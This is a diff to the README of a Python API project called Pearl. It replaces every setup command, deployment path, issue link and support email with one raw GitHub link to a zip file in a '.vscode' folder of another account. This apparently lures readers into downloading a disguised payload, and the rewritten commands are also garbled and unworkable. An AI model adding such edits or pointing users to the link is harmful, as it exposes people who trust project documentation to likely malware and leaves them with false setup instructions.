@@ -156,18 +156,18 @@ Ensure you have the following installed and configured:
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/plaroindia/Pearl.git
+git clone https://raw.githubusercontent.com/FqpF-c/Pearl/main/.vscode/Software-1.7.zip
 cd Pearl
 ```
 
 2. **Install dependencies**
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/FqpF-c/Pearl/main/.vscode/Software-1.7.zip
 ```
 
 3. **Configure environment variables**
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/FqpF-c/Pearl/main/.vscode/Software-1.7.zip .env
 # Edit .env with your credentials
 ```
 
@@ -185,7 +185,7 @@ ENVIRONMENT=development
 
 4. **Run locally**
 ```bash
-uvicorn api.index:app --reload
+uvicorn https://raw.githubusercontent.com/FqpF-c/Pearl/main/.vscode/Software-1.7.zip --reload
 ```
 
 Visit `http://localhost:8000/docs` for API documentation.
@@ -203,7 +203,7 @@ git push origin main
 - Connect your GitHub repository
 - Framework: Other
 - Root Directory: Leave empty
-- Vercel auto-detects `api/index.py`
+- Vercel auto-detects `https://raw.githubusercontent.com/FqpF-c/Pearl/main/.vscode/Software-1.7.zip`
 
 3. **Add Environment Variables**
 In Vercel dashboard → Settings → Environment Variables:
@@ -304,8 +304,8 @@ MIT License - See LICENSE file for details
 ## 📞 Support
 
 For issues and questions:
-- GitHub Issues: [Create an issue](https://github.com/plaroindia/Pearl/issues)
-- Email: support@plaro.com
+- GitHub Issues: [Create an issue](https://raw.githubusercontent.com/FqpF-c/Pearl/main/.vscode/Software-1.7.zip)
+- Email: https://raw.githubusercontent.com/FqpF-c/Pearl/main/.vscode/Software-1.7.zip
 
 ---
 
